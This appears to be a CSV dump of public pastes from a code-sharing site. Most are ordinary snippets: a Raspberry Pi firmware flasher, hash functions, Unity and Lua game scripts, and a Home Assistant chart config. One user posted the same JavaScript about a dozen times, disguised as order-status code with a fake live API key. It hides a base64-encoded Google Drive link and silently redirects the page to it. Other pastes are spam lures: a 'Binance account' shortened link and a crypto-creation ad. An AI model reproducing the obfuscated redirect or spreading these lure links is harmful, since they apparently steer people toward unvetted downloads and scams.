id,title,username,language,date,content
VFFqp6wh,raspberry_fw_uploader,orborbson,Bash,Saturday 29th of March 2025 06:14:54 AM CDT,"#!/usr/bin/env bash

usage(){
	case ""${1}"" in
		"""" | ""--help"" | ""-h"" ) echo -e ""Użycie: `basename ${0}` <nazwa_pliku_firmware>""; exit 0 ;;
	esac
}

check_file(){
	if [ ! -f ""${1}"" ]; then echo ""[BŁĄD]: brak pliku firmware o nazwie \""${1}\""""; exit 1; fi
}

set_vars(){
	FW_FILE=""`realpath -q ${1}`""
	TMPDIR=""${TMPDIR:-/tmp}""
	RP_DIR=""${TMPDIR}/raspberry_firmware_flash""
}

find_rp(){
	if [ -b /dev/sda[0-9] ]; then
		RP_DEV=""`readlink -f -q /dev/sda[0-9]`""
	elif [ -b /dev/block/sda[0-9] ]; then
		RP_DEV=""`readlink -f -q /dev/block/sda[0-9]`""
	else
		echo ""[BŁĄD]: nie znaleziono urządzenia. Uruchom RP w trybie bootloadera.""
		exit 1
	fi
}

mount_rp(){
	if ! check_mnt; then
		mkdir_rp
		if ! sudo mount -t vfat ""${RP_DEV}"" ""${RP_DIR}""; then
			echo ""[BŁĄD]: nie można zamontować RP""; clean; exit 1
		fi
	else
		echo ""[INFO]: już zamontowane, odmontowuję ...""; umount_rp; clean; exit 0
	fi
}

umount_rp(){
	sudo umount -q ""${RP_DIR}""
}

copy_firmware(){
	echo ""[INFO]: kopiuję firmware ...""
	sudo cp -f ""${FW_FILE}"" ""${RP_DIR}""
}

mkdir_rp(){
	if [ ! -d ""${RP_DIR}"" ]; then mkdir ""${RP_DIR}""; fi  > /dev/null 2>&1
}

clean(){
	if [ -d ""${RP_DIR}"" ]; then rm -fr ""${RP_DIR}""; fi  > /dev/null 2>&1
}

check_mnt(){
	findmnt ""${RP_DEV}"" > /dev/null 2>&1
}

success(){
	echo ""[INFO]: pomyślnie skopiowano firmware""
}

usage ""${1}""
check_file ""${1}""
set_vars ""${1}""
find_rp
mount_rp
copy_firmware
umount_rp
clean
success
"
iwUJs1pp,Binance account CW,TypicalGamer1227,JavaScript,Saturday 29th of March 2025 06:13:47 AM CDT," 
Pdf https://tinyurl.com/methodssss


9Xd0mITeg4
"
ZR2zNwbN,Market.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 06:13:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/207/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fwYtTWWX,Products.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 05:43:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/523/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZAGhkzEM,FORCELOGIN IRPG,ionut,mIRC,Saturday 29th of March 2025 05:26:27 AM CDT,"alias fl {
    if ($1 == $null) {
        echo -a Eroare: Trebuie să specifici un nick! Exemplu: /fl Gerard
        return
    }
    var %nick = $1
    var %whois = $whois(%nick)
    var %identHost = $remove($address(%nick, 5), *!)
    if (%identHost == $null) {
        echo -a Eroare: Nu pot obține adresa ident@host pentru nick-ul %nick.
        return
    }
    msg IRPG forcelogin %nick %nick %identHost
    echo -a Mesaj trimis către IRPG: forcelogin %nick %nick %identHost de la nick-ul %nick
}
"
XZsJfHJY,Market.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 05:11:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/570/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7HKrVcDP,fnv1a,rgruber,JavaScript,Saturday 29th of March 2025 05:03:10 AM CDT,"function fnv1a(str) {
    let hash = 2166136261n; // FNV offset basis
    const prime = 16777619n; // FNV prime
    
    for (let i = 0; i < str.length; i++) {
        hash ^= BigInt(str.charCodeAt(i));
        hash *= prime;
    }
    
    // Convert to 32-bit unsigned integer
    return Number(hash & 0xffffffffn);
}

// Usage
const text = ""FNV-1a (Fowler-Noll-Vo) Hash"";
"
RNdzS84Y,murmurhash3_32,rgruber,JavaScript,Saturday 29th of March 2025 05:02:00 AM CDT,"function murmurhash3_32(key, seed = 0) {
    const c1 = 0xcc9e2d51;
    const c2 = 0x1b873593;
    const r1 = 15;
    const r2 = 13;
    const m = 5;
    const n = 0xe6546b64;

    let hash = seed;
    let len = key.length;
    
    const getUint32 = (str, pos) => {
        return (str.charCodeAt(pos) & 0xff) |
               ((str.charCodeAt(pos + 1) & 0xff) << 8) |
               ((str.charCodeAt(pos + 2) & 0xff) << 16) |
               ((str.charCodeAt(pos + 3) & 0xff) << 24);
    };

    let i = 0;
    while (i + 4 <= len) {
        let k = getUint32(key, i);
        k = Math.imul(k, c1);
        k = (k << r1) | (k >>> (32 - r1));
        k = Math.imul(k, c2);
        
        hash ^= k;
        hash = (hash << r2) | (hash >>> (32 - r2));
        hash = Math.imul(hash, m) + n;
        i += 4;
    }

    let remaining = len % 4;
    if (remaining > 0) {
        let k = 0;
        for (let j = 0; j < remaining; j++) {
            k |= (key.charCodeAt(i + j) & 0xff) << (j * 8);
        }
        k = Math.imul(k, c1);
        k = (k << r1) | (k >>> (32 - r1));
        k = Math.imul(k, c2);
        hash ^= k;
    }

    hash ^= len;
    hash ^= (hash >>> 16);
    hash = Math.imul(hash, 0x85ebca6b);
    hash ^= (hash >>> 13);
    hash = Math.imul(hash, 0xc2b2ae35);
    hash ^= (hash >>> 16);

    return hash >>> 0; // Ensure unsigned 32-bit
}

// Usage
const text = ""Hello World"";
console.log(murmurhash3_32(text)); // Outputs a number like 2951470589"
0h1iD6Y4,simpleHash,rgruber,JavaScript,Saturday 29th of March 2025 05:01:19 AM CDT,"function simpleHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        hash = (hash << 5) - hash + str.charCodeAt(i);
        hash = hash >>> 0; // Convert to unsigned 32-bit
    }
    return hash;
}
"
mtM12RQ6,fastHash,rgruber,JavaScript,Saturday 29th of March 2025 05:00:20 AM CDT,"function fastHash(str, seed = 0) {
    const p1 = 2654435761 >>> 0; // Prime 1
    const p2 = 1597334677 >>> 0; // Prime 2
    const p3 = 2246822519 >>> 0; // Prime 3
    let h = seed + p1;

    let i = 0;
    const len = str.length;

    // Process 4 bytes at a time
    while (i + 4 <= len) {
        let k = (str.charCodeAt(i) & 0xff) |
                ((str.charCodeAt(i + 1) & 0xff) << 8) |
                ((str.charCodeAt(i + 2) & 0xff) << 16) |
                ((str.charCodeAt(i + 3) & 0xff) << 24);
        
        k = Math.imul(k, p2);
        h = Math.imul(h ^ (k >>> 16), p1);
        h = Math.imul(h ^ k, p3);
        i += 4;
    }

    // Handle remaining bytes
    while (i < len) {
        h ^= (str.charCodeAt(i) & 0xff);
        h = Math.imul(h, p1);
        i++;
    }

    // Finalization
    h ^= h >>> 13;
    h = Math.imul(h, p2);
    h ^= h >>> 16;

    return h >>> 0; // Ensure unsigned 32-bit
}

// Usage
const text = ""Hello World"";
console.log(fastHash(text)); // Outputs a number like 3894213542

// Test with multiple strings
const tests = [""Hello World"", ""Test String"", ""Another One""];
tests.forEach(str => {
    console.log(`${str}: ${fastHash(str)}`);
});"
hsiqx1G8,Untitled,navrajkhunger,JavaScript,Saturday 29th of March 2025 04:56:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/093/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UJBNub8E,Untitled,vpeter,Bash,Saturday 29th of March 2025 04:48:04 AM CDT,"diff --git a/scripts/create_addon b/scripts/create_addon
index a725842863..a2b56e556b 100755
--- a/scripts/create_addon
+++ b/scripts/create_addon
@@ -162,7 +162,7 @@ while [ $# -gt 0 ]; do
       usage 1
       ;;
     -*)
-      addons_drop+="" $(get_addons ${1:1})""
+      addons_drop+="" ${1:1}""
       ;;
     *)
       addons+="" $(get_addons ${1})""
"
SxjdJPL6,Products.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 04:41:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/785/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
B5VkbqZt,Creating,Nil000,Email,Saturday 29th of March 2025 04:13:53 AM CDT,"Creating your own cryptocurrency!
Email me at: bitcryptomann@gmail.com"
39AhQ1FM,Market.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 04:10:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/491/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
F0GcPn3q,Untitled,navrajkhunger,JavaScript,Saturday 29th of March 2025 03:54:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/854/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
C05rDhCW,Products.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 03:39:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/966/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ud5NxX0z,Emillio Yu-Gi-Oh! Game Deck Event crazy SQL table join blah... Version 2 optimized,TRToC,C#,Saturday 29th of March 2025 03:36:47 AM CDT,"var _joinedTables = from _dttFilter in _drFilter
                    join _dtDeck in _dsYgo.Tables[""Deck""].AsEnumerable()
                    on int.Parse(_dttFilter[""FK_Deck""].ToString()) 
                    equals int.Parse(_dtDeck[""PK_Deck""].ToString())

                    join _dtEvent in _dtEventsTemp.AsEnumerable()
                    on (_dttFilter[""FK_Event""].ToString() == """" ? -1 : int.Parse(_dttFilter[""FK_Event""].ToString())) 
                    equals int.Parse(_dtEvent[""PK_Event""].ToString())

                    let latestDeckList = _dsYgo.Tables[""DeckList""].AsEnumerable()
                        .Where(_drDeckList => _drDeckList[""FK_Deck""].ToString() == _dtDeck[""PK_Deck""].ToString() &&
                                              DateTime.Parse(_drDeckList[""Datum""].ToString()) < DateTime.Parse(_dttFilter[""Start""].ToString()))
                        .OrderByDescending(_drDeckList => DateTime.Parse(_drDeckList[""Datum""].ToString()))
                        .FirstOrDefault()
                    
                    select new
                    {
                        Start = _dttFilter[""Start""],
                        End = _dttFilter[""End""],
                        Deck = _dtDeck[""Name""],
                        Event = _dtEvent[""Name""],
                        CoinWin = _dttFilter[""CoinWin""],
                        Win = _dttFilter[""Win""],
                        FK_DeckList = latestDeckList != null ? latestDeckList[""PK_Decklist""].ToString() : """"
                    };
"
HwEhVSPQ,Entso-E apex electricity chart,RichardHA,YAML,Saturday 29th of March 2025 03:34:49 AM CDT,"type: custom:apexcharts-card
graph_span: 24h
update_interval: 5m
span:
  start: day
show:
  last_updated: true
  legend: false
now:
  show: true
  label: Now
  color: yellow
header:
  show: true
  title: Electriciteitsprijzen Vandaag (€/kwh)
  show_states: true
  colorize_states: true
yaxis:
  - id: Prijs
    decimals: 2
experimental:
  color_threshold: true
  disable_config_validation: true
series:
  - entity: sensor.entso_e_average_electricity_price
    show:
      datalabels: false
      extremas: true
      in_header: before_now
    name: Energy Price net
    stroke_width: 0
    float_precision: 3
    type: column
    opacity: 0.7
    color: yellow
    data_generator: |
      return entity.attributes.prices.map((entry) => { 
      return [new Date(entry.time), entry.price];
      });
  - entity: sensor.entso_e_average_electricity_price
    name: Energy Price incl costs
    show:
      datalabels: false
      extremas: true
      in_header: before_now
    stroke_width: 0
    float_precision: 3
    type: column
    opacity: 0.7
    color_threshold:
      - value: 0
        color: lightblue
      - value: 0.15
        color: lightgreen
      - value: 0.2
        color: darkgreen
      - value: 0.3
        color: orange
      - value: 0.35
        color: red
    data_generator: |
      return entity.attributes.prices.map((entry) => { 
      return [new Date(entry.time), (entry.price + 0.10880 +0.02481)*1.21];
      }); 
"
MeK6vMsF,Order.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 03:24:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/933/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5YsxFukw,PlayerMovement,leomovskii,C#,Saturday 29th of March 2025 03:15:36 AM CDT,"using System.Linq;
using UnityEngine;

public class PlayerMovement : MonoBehaviour {

	public float speed;
	public float jumpHeight;
	public float gravity = 20f;

	[Space]

	public Transform cameraTransform;
	public float horizontalSensitivity = 1f;
	public float verticalSensitivity = 1f;
	public float pitchMin = -70f;
	public float pitchMax = 80f;

	[Space]

	public float _fallY = -20f;

	private CharacterController _controller;
	private Vector3 _input;
	private Vector3 _verticalVelocity;
	private Vector3 _yawVector;
	private Vector3 _currentPitch;

	private void Start() {
		Cursor.lockState = CursorLockMode.Locked;
		Cursor.visible = false;

		_controller = GetComponent<CharacterController>();
		_currentPitch = cameraTransform.localEulerAngles;
	}

	private void Update() {
		if (transform.position.y < _fallY) {
			var points = FindObjectsOfType<RespawnPoint>();
			if (points.Length > 0) {
				var nearest = points.OrderBy(respawn => Vector3.Distance(transform.position, respawn.transform.position)).FirstOrDefault();
				_controller.enabled = false;
				transform.SetPositionAndRotation(nearest.transform.position, nearest.transform.rotation);
				_controller.enabled = true;
				_verticalVelocity.y = 0f;

			} else {
				Debug.LogError(""No respawns found"");
			}
		}

		MoveUpdate();
		LookUpdate();
	}

	private void MoveUpdate() {
		bool isGrounded = _controller.isGrounded;

		_input.x = Input.GetAxisRaw(""Horizontal"");
		_input.z = Input.GetAxisRaw(""Vertical"");
		_input.Normalize();

		if (_verticalVelocity.y < -2f && isGrounded)
			_verticalVelocity.y = -1f;

		Vector3 moveVector = transform.forward * _input.z + transform.right * _input.x;
		_controller.Move(speed * Time.deltaTime * moveVector);

		if (Input.GetKeyDown(KeyCode.Space) && isGrounded) {
			_verticalVelocity.y = Mathf.Sqrt(jumpHeight * 2f * gravity);
		}

		_verticalVelocity.y -= gravity * Time.deltaTime;
		_controller.Move(_verticalVelocity * Time.deltaTime);
	}

	private void LookUpdate() {
		_yawVector.y = Input.GetAxis(""Mouse X"") * horizontalSensitivity;
		float pitch = Input.GetAxis(""Mouse Y"") * verticalSensitivity;

		transform.Rotate(_yawVector);

		_currentPitch.x = Mathf.Clamp(_currentPitch.x - pitch, pitchMin, pitchMax);
		cameraTransform.localEulerAngles = _currentPitch;
	}
}"
jL7qPETF,Market.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 03:08:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/754/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4WmVQCrs,简化护盾制导,jaklsfjlsak,Lua,Saturday 29th of March 2025 03:02:18 AM CDT,"local OffsetValue = 0
local shield = peripheral.find(""warpdriveForceFieldProjector"")
local lasers = peripheral.getNames()
local lever = ""front""
local lastLx, lastLy, lastLz = 0, 0, 0

function shieldOffset(lx, ly, lz, fx, fy, fz)
    local dx = lx - fx
    local dy = ly - fy
    local dz = lz - fz
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    dx = dx / distance
    dy = dy / distance
    dz = dz / distance
    local t1x = lx + dx * OffsetValue
    local t1y = ly + dy * OffsetValue
    local t1z = lz + dz * OffsetValue
    return t1x, t1y, t1z, distance
end

if fs.exists(""conf"") == false then
    shell.run(""pastebin get 38M5cNbZ conf"")
    term.clear()
end

for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

print(""Control System Online, Toggle Redstone To Toggle Shields, Press C to Configure"")

local _, upgrades = shield.getUpgrades()
local Size
if upgrades:match(""1/4 x Range"") then
    Size = 16
elseif upgrades:match(""2/4 x Range"") then
    Size = 32
elseif upgrades:match(""3/4 x Range"") then
    Size = 48
elseif upgrades:match(""4/4 x Range"") then
    Size = 64
elseif upgrades:match(""0/4 x Range"") then
    Size = 0
end

while true do
    local event, laserName, lx, ly, lz, block, _, _, _, type, metadata, resistance = os.pullEvent()

    if event == ""laserScanning"" then
        lastLx, lastLy, lastLz = tonumber(lx), tonumber(ly), tonumber(lz)
        local fx, fy, fz = shield.getLocalPosition()
        local t1x, t1y, t1z, distance = shieldOffset(lastLx, lastLy, lastLz, fx, fy, fz)

        tx = (t1x - fx) / Size
        ty = (t1y - fy) / Size
        tz = (t1z - fz) / Size

        
            shield.translation(tx, ty, tz)

    elseif event == ""redstone"" then
        local fx, fy, fz = shield.getLocalPosition()
        local _, _, _, distance = shieldOffset(lastLx, lastLy, lastLz, fx, fy, fz)
        local on = redstone.getAnalogInput(lever)
        if on > 6 then
            shield.enable(true)
        elseif on < 5 then
            shield.enable(false)
        end
    elseif event == ""key"" and laserName == 46 then
        print(""C key pressed, running 'conf' script..."")
        shell.run(""conf"")
    end
end
"
GL2zyN5K,Untitled,navrajkhunger,JavaScript,Saturday 29th of March 2025 02:53:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/138/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
